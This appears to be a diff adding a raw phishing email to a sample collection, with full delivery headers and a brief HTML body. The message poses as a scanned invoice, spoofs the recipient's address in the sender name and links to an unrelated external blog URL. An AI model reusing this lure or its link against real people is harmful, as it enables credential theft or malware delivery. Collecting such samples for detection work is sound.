@@ -1,0 +1,54 @@
+ARC-Authentication-Results: i=1; jtaylor@znltygvvxf.biz;
+       dkim=pass header.i=@ka5m256k02.net header.s=default header.b=qOACyGIa;
+       spf=pass (jtaylor@znltygvvxf.biz: domain of reni@ka5m256k02.net designates 212.70.156.74 as permitted sender) smtp.mailfrom=reni@ka5m256k02.net
+Return-Path: <reni@ka5m256k02.net>
+Received: from hosting.hashlink.net (hosting.hashlink.net. [212.70.156.74])
+        by jtaylor@znltygvvxf.biz with ESMTPS id v16si14935054wrm.71.2020.07.20.13.32.52
+        for jtaylor@znltygvvxf.biz
+        (version=TLS1_2 cipher=ECDHE-ECDSA-AES128-GCM-SHA256 bits=128/128);
+        Mon, 20 Jul 2020 13:32:52 -0700 (PDT)
+Received-SPF: pass (jtaylor@znltygvvxf.biz: domain of reni@ka5m256k02.net designates 212.70.156.74 as permitted sender) client-ip=212.70.156.74;
+Authentication-Results: jtaylor@znltygvvxf.biz;
+       dkim=pass header.i=@ka5m256k02.net header.s=default header.b=qOACyGIa;
+       spf=pass (jtaylor@znltygvvxf.biz: domain of reni@ka5m256k02.net designates 212.70.156.74 as permitted sender) smtp.mailfrom=reni@ka5m256k02.net
+Message-ID: <5f15ff74.1c69fb81.f0e81.1aecSMTPIN_ADDED_MISSING@jtaylor@znltygvvxf.biz>
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
+	d=ka5m256k02.net; s=default; h=Content-Transfer-Encoding:Content-Type:
+	MIME-Version:Subject:To:From:Date:Sender:Reply-To:Message-ID:Cc:Content-ID:
+	Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
+	:Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
+	List-Subscribe:List-Post:List-Owner:List-Archive;
+	bh=WxiKpdyNSYRXjYy8YX38v16sYaghUYun725kewlYeYk=; b=qOACyGIaCmAhHAUbneb8dhType
+	LkZzauUVQ7dUnrhH7RjTHxm/h9PLhMKWJv0JaXqroHKTWcaVH02g8WEUCjBQseCL2gfIvrQp9V3ob
+	fd3sa2cXGt+5oe3SHuhs5TvezUcnA3CN9DdfKmrNKTxOxgkJRTwkLSdZX2so6XR9g7Tgnjd3bDotO
+	RvZYugPtxRXKvypy67EGrhkgCxOY43+xCl4dN22mMXLf4Swa7w4mxEBJjVQteHrtSXVPZV3eLn2o3
+	bohNZJVj+90FsOZXp85ZMrim5R5Th4gz9yNQDteJfgkervxA43hYMGahIecSRl1T7HUcerj62ijCj
+	p/8zB2kw==;
+Received: from [5.83.82.4] (port=59113)
+	by hosting.hashlink.net with esmtpsa  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
+	(Exim 4.93)
+	(envelope-from <reni@ka5m256k02.net>)
+	id 1jxcSx-00070F-Ju
+	for jtaylor@znltygvvxf.biz; Mon, 20 Jul 2020 23:32:51 +0300
+Date: Mon, 20 Jul 2020 22:32:51 +0100
+From: "jtaylor@znltygvvxf.biz <jtaylor@znltygvvxf.biz@jtaylor@znltygvvxf.biz>" <reni@ka5m256k02.net>
+To: jtaylor@znltygvvxf.biz
+Subject: Inv EO13369692 from [recipient's email domain]
+MIME-Version: 1.0
+Content-Type: text/html; charset=UTF-8
+Content-Transfer-Encoding: quoted-printable
+X-Get-Message-Sender-Via: hosting.hashlink.net: authenticated_id: ren8918368@ka5m256k02.net
+X-Authenticated-Sender: hosting.hashlink.net: ren8918368@ka5m256k02.net
+
+<html>
+<body>
+Please see attachment for your scanned document.=0D
+<br>
+<br>
+<a href=3D"http://barjaktarapartments.me/blog/13-41ci-438/">http://barjakta=
+rapartments.me/blog/13-41ci-438/</a>
+<br>
+<br>
+<i>[recipient's email domain]</i>
+</body>
+</html>
